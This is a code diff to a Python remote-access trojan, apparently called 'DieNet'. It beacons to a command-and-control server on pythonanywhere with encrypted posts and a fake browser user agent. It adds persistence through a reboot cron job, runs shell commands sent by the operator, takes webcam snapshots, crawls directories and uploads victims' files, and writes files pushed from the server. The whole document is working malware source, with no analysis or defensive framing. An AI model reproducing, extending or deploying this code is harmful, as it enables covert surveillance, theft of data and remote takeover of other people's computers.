@@ -17,7 +17,7 @@ import hashlib
 
 # ========================= CONFIG =========================
 SERVER_URL = "https://velvetteam.pythonanywhere.com"
-CHECKIN_INTERVAL = (28, 47)
+CHECKIN_INTERVAL = (25, 50)
 
 AES_KEY = hashlib.sha256(b'dienet-velvetteam-secret-change-this').digest()
 
@@ -25,7 +25,7 @@ HOSTNAME = os.environ.get("COMPUTERNAME", platform.node()) or f"PC-{uuid.getnode
 
 FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
 
-# Webcam
+# Webcam support
 try:
     import cv2
     HAS_CV2 = True
@@ -62,13 +62,10 @@ def add_persistence():
             pass
     elif sys_name == "Linux":
         try:
-            cron = f'(crontab -l 2>/dev/null; echo "@reboot nohup {exe_path} >/dev/null 2>&1 &") | crontab -'
-            subprocess.run(cron, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot nohup {exe_path} >/dev/null 2>&1 &") | crontab -'
+            subprocess.run(cron_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except:
             pass
-    elif sys_name == "Darwin":
-        # macOS LaunchAgent (simplified)
-        pass
 
 # ====================== CRYPTO ======================
 def aes_encrypt(data: dict) -> str:
@@ -100,7 +97,7 @@ def enc_post(endpoint: str, payload: dict):
 # ====================== SYSTEM INFO ======================
 def get_system_info():
     try:
-        cpu = psutil.cpu_percent(interval=0.7)
+        cpu = psutil.cpu_percent(interval=0.8)
         ram = psutil.virtual_memory().percent
         disk_path = 'C:\\' if platform.system() == "Windows" else '/'
         disk = psutil.disk_usage(disk_path).percent
@@ -150,36 +147,61 @@ def stream_loop():
         img = take_snapshot()
         if img:
             enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": img})
-        time.sleep(4.2)
+        time.sleep(4)
 
-# ====================== FIXED FILE LISTING ======================
-def get_file_list(path="/"):
+# ====================== FIXED FILE LIST FOR LINUX ======================
+def get_file_list(start_path="/"):
     files = []
     try:
-        if not os.path.exists(path):
-            path = os.path.expanduser("~") if path == "/" else path
+        # On Linux, start from home if root is not accessible
+        if start_path == "/" and platform.system() == "Linux":
+            start_path = os.path.expanduser("~")
 
-        for item in os.listdir(path):
-            full_path = os.path.join(path, item)
-            try:
-                is_dir = os.path.isdir(full_path)
-                size = os.path.getsize(full_path) if not is_dir else 0
-                modified = time.strftime("%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(full_path)))
-                
-                files.append({
-                    "path": full_path.replace("\\", "/"),
-                    "name": item,
-                    "is_dir": is_dir,
-                    "size": size,
-                    "modified": modified
-                })
-            except:
-                continue
-
-            if len(files) > 800:  # safety limit
+        for root, dirs, filenames in os.walk(start_path, topdown=True, onerror=None):
+            # Limit depth and count to avoid hanging
+            if root.count(os.sep) - start_path.count(os.sep) > 3:
+                del dirs[:]  # Don't go deeper than 3 levels
+            if len(files) > 600:
                 break
+
+            for name in filenames[:40]:   # limit per folder
+                full_path = os.path.join(root, name)
+                try:
+                    size = os.path.getsize(full_path)
+                    mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(full_path)))
+                    files.append({
+                        "path": full_path.replace("\\", "/"),
+                        "name": name,
+                        "is_dir": False,
+                        "size": size,
+                        "modified": mtime
+                    })
+                except:
+                    continue
+
+            for name in dirs[:15]:
+                full_path = os.path.join(root, name)
+                try:
+                    mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(full_path)))
+                    files.append({
+                        "path": full_path.replace("\\", "/"),
+                        "name": name,
+                        "is_dir": True,
+                        "size": 0,
+                        "modified": mtime
+                    })
+                except:
+                    continue
     except:
         pass
+
+    # Fallback: at least send home directory if nothing found
+    if not files and platform.system() == "Linux":
+        try:
+            files = get_file_list(os.path.expanduser("~"))
+        except:
+            pass
+
     return files
 
 # ====================== COMMAND HANDLER ======================
@@ -190,17 +212,14 @@ def handle_command(cmd: str):
 
     if cmd.startswith("shell:"):
         try:
-            result = subprocess.run(cmd[6:], shell=True, capture_output=True, text=True, timeout=30)
+            result = subprocess.run(cmd[6:], shell=True, capture_output=True, text=True, timeout=25)
             output = (result.stdout + result.stderr)[:48000]
         except Exception as e:
             output = f"Error: {str(e)}"
         enc_post("/api/cmdresult", {"hostname": HOSTNAME, "cmd": cmd[6:], "output": output})
 
     elif cmd == "filelist":
-        # Send root or home directory listing
         files = get_file_list("/")
-        if not files:
-            files = get_file_list(os.path.expanduser("~"))
         enc_post("/api/filelist", {"hostname": HOSTNAME, "files": files})
 
     elif cmd.startswith("getfile:"):
@@ -208,7 +227,7 @@ def handle_command(cmd: str):
         try:
             if os.path.isfile(path):
                 with open(path, "rb") as f:
-                    b64 = base64.b64encode(f.read(15 * 1024 * 1024)).decode()
+                    b64 = base64.b64encode(f.read(12 * 1024 * 1024)).decode()  # 12MB limit
                 enc_post("/api/pushfile", {"hostname": HOSTNAME, "path": path.replace("\\", "/"), "data_b64": b64})
         except:
             pass
@@ -225,10 +244,10 @@ def handle_command(cmd: str):
         resp = enc_post(f"/api/pendingupload/{HOSTNAME}", {})
         if resp and resp.get("status") == "ok":
             try:
-                dest = resp["dest_path"]
+                dest = resp.get("dest_path")
                 os.makedirs(os.path.dirname(dest), exist_ok=True)
                 with open(dest, "wb") as f:
-                    f.write(base64.b64decode(resp["data_b64"]))
+                    f.write(base64.b64decode(resp.get("data_b64", "")))
             except:
                 pass
 
@@ -261,10 +280,9 @@ def main():
     hide_everything()
     add_persistence()
 
-    # Single instance (Windows)
     if platform.system() == "Windows":
         try:
-            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\DieNetAgentMutex")
+            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\DieNetMutex")
             if ctypes.windll.kernel32.GetLastError() == 0xB7:
                 sys.exit(0)
         except:
@@ -281,7 +299,7 @@ def main():
             time.sleep(random.randint(*CHECKIN_INTERVAL))
 
         except:
-            time.sleep(18)
+            time.sleep(20)
 
 if __name__ == "__main__":
     main()
